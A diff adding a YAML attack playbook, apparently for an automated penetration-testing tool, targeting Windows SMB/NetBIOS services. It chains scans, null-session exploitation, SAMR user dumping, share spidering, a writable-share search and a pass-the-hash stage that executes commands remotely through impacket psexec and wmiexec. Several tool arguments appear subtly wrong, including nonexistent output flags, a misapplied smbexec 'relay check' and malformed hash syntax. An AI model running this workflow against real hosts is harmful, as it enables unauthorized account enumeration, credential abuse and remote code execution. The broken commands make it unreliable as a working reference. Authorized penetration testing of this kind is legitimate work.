@@ -1,0 +1,200 @@
+name: "SMB & NetBIOS Enumeration"
+description: "SMB share discovery, null session attacks, RPC enumeration, MSRPC abuse, SMB relay detection, and pass-the-hash"
+version: "1.0"
+
+vars:
+  target_workgroup: ""
+  smb_user: ""
+  smb_pass: ""
+  smb_hash: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "SMB/NetBIOS enumeration against {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: NetBIOS & host discovery ----
+  - id: netbios_discovery
+    name: "NetBIOS and SMB service discovery"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: nmap_smb
+        name: "SMB port scan"
+        tool: nmap
+        args: ["-p", "137,139,445", "--open", "-T4",
+               "{target}", "-oN", "{case_dir}/smb_nmap.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/smb_nmap.txt"]
+
+      - id: nbtscan
+        name: "NetBIOS name table scan"
+        tool: nbtscan
+        args: ["-r", "{target}",
+               "-o", "{case_dir}/nbtscan_output.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/nbtscan_output.txt"]
+
+      - id: smb_version
+        name: "SMB version fingerprint"
+        tool: nmap
+        args: ["-p", "445", "--script", "smb-protocols",
+               "{target}", "-oN", "{case_dir}/smb_version.txt"]
+        timeout: 30
+
+      - id: enum4linux
+        name: "enum4linux full scan"
+        tool: enum4linux
+        args: ["-a", "{target}",
+               "-o", "{case_dir}/enum4linux_output.txt"]
+        timeout: 300
+        artifacts: ["{case_dir}/enum4linux_output.txt"]
+
+  # ---- Phase 2: Share enumeration ----
+  - id: share_enum
+    name: "SMB share enumeration"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: smbclient_null
+        name: "Null session share list"
+        tool: smbclient
+        args: ["-L", "//{target}/", "-N",
+               "-o", "{case_dir}/smb_shares_null.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/smb_shares_null.txt"]
+
+      - id: smbmap_null
+        name: "smbmap null session"
+        tool: smbmap
+        args: ["-H", "{target}", "-u", "guest",
+               "-o", "{case_dir}/smbmap_null.txt"]
+        timeout: 30
+
+      - id: smbclient_auth
+        name: "Authenticated share list"
+        tool: smbclient
+        args: ["-L", "//{target}/",
+               "-U", "{smb_user}%{smb_pass}",
+               "-o", "{case_dir}/smb_shares_auth.txt"]
+        timeout: 30
+
+  # ---- Phase 3: Null session exploitation ----
+  - id: null_session
+    name: "Null session exploitation"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: rpcdump
+        name: "MSRPC endpoint dump"
+        tool: impacket-rpcdump
+        args: ["-target-ip", "{target}",
+               "-o", "{case_dir}/rpcdump.txt"]
+        timeout: 120
+        artifacts: ["{case_dir}/rpcdump.txt"]
+
+      - id: samrdump
+        name: "SAMR user enumeration"
+        tool: impacket-samrdump
+        args: ["-target-ip", "{target}",
+               "-o", "{case_dir}/samrdump_users.txt"]
+        timeout: 60
+
+      - id: srvinfo
+        name: "SMB server info"
+        tool: impacket-srvinfo
+        args: ["-target-ip", "{target}",
+               "-o", "{case_dir}/srvinfo.txt"]
+        timeout: 30
+
+      - id: netview
+        name: "Network session enumeration"
+        tool: impacket-netview
+        args: ["-target-ip", "{target}",
+               "-o", "{case_dir}/netview.txt"]
+        timeout: 60
+
+  # ---- Phase 4: Spider shares ----
+  - id: spider_shares
+    name: "Recursive share content spider"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: smbmap_spider
+        name: "smbmap recursive spider"
+        tool: smbmap
+        args: ["-H", "{target}", "-R", "--depth", "5",
+               "-u", "{smb_user}", "-p", "{smb_pass}",
+               "-o", "{case_dir}/smbmap_spider.txt"]
+        timeout: 300
+        artifacts: ["{case_dir}/smbmap_spider.txt"]
+
+      - id: smbmap_writeable
+        name: "Find writable shares"
+        tool: smbmap
+        args: ["-H", "{target}", "-u", "{smb_user}", "-p", "{smb_pass}",
+               "--rw",
+               "-o", "{case_dir}/smb_writable_shares.txt"]
+        timeout: 120
+
+  # ---- Phase 5: SMB relay detection ----
+  - id: relay_detect
+    name: "SMB signing and relay checks"
+    type: parallel
+    max_workers: 2
+    steps:
+      - id: smb_signing
+        name: "SMB signing check"
+        tool: nmap
+        args: ["-p", "445", "--script", "smb2-security-mode",
+               "{target}", "-oN", "{case_dir}/smb_signing.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/smb_signing.txt"]
+
+      - id: smb2_time
+        name: "SMB2 time / relay window"
+        tool: impacket-smbexec
+        args: ["-target-ip", "{target}",
+               "-o", "{case_dir}/smb_relay_check.txt"]
+        timeout: 30
+
+  # ---- Phase 6: Pass-the-hash ----
+  - id: pth_attacks
+    name: "Pass-the-hash execution"
+    type: conditional
+    condition:
+      any:
+        - exists: "{smb_hash}"
+    then:
+      - id: psexec_pth
+        name: "Impacket psexec (PTH)"
+        tool: impacket-psexec
+        args: ["-hashes", "LM:NT", "{smb_hash}",
+               "{smb_user}@{target}",
+               "whoami",
+               "-o", "{case_dir}/pth_psexec.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/pth_psexec.txt"]
+
+      - id: wmiexec_pth
+        name: "Impacket wmiexec (PTH)"
+        tool: impacket-wmiexec
+        args: ["-hashes", "LM:NT", "{smb_hash}",
+               "{smb_user}@{target}",
+               "whoami",
+               "-o", "{case_dir}/pth_wmiexec.txt"]
+        timeout: 60
+
+  # ---- Phase 7: Report ----
+  - id: report
+    name: "SMB enumeration note"
+    type: log
+    message: |
+      SMB/NetBIOS enumeration complete for {target}.
+      Results in {case_dir}/:
+      - Shares: smb_shares_null.txt, smb_shares_auth.txt
+      - Users: samrdump_users.txt
+      - Spider content: smbmap_spider.txt
+      - Writable: smb_writable_shares.txt
+      - Signing: smb_signing.txt
